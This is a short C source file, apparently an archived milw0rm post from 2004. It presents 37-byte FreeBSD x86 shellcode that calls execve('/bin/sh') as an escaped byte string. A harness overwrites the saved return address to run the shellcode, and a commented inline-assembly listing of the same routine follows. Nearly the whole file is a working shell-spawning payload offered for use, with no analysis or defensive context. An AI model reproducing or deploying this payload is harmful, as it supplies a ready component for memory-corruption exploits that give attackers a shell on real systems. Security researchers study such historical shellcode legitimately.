/* This is FreeBSD execve() code.It is 37 bytes long.I'll try to make it *
 * smaller.Till then use this one.                                       *
 *                                       signed predator                 *
 *                                       preedator(at)sendmail(dot)ru    *
 *************************************************************************/

char FreeBSD_code[]=
"\xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x50\x8d"
"\x53\x08\x52\x53\xb0\x3b\x50\xcd\x80\xe8\xe4\xff\xff\xff/bin/sh";

int main(){
 int *ret=(int *)(&ret+2);
 printf("len : %d\n",strlen(FreeBSD_code));
 *ret=(int)FreeBSD_code;
}

/*****************************************
 *int main(){                            *
 *   __asm__("jmp  callme         \n"    *
 *           "jmpme:              \n"    *
 *           "pop %ebx            \n"    *
 *           "xorl %eax,%eax      \n"    *
 *           "movb %al,0x7(%ebx)  \n"    *
 *           "movl %ebx,0x8(%ebx) \n"    *
 *	     "movl %eax,0xc(%ebx) \n"    *
 *           "push %eax           \n"    *
 *	     "leal 0x8(%ebx),%edx \n"    *
 *	     "push %edx           \n"    *
 *	     "push %ebx           \n"    *
 *	     "movb $0x3b,%al      \n"    *
 *           "push %eax	          \n"    *
 *           "int $0x80           \n"    *
 *           "callme:	          \n"    *
 *           "call jmpme          \n"    *
 *           ".string \"/bin/sh\" \n");  *
 *}                                      *
 *****************************************/

// milw0rm.com [2004-09-26]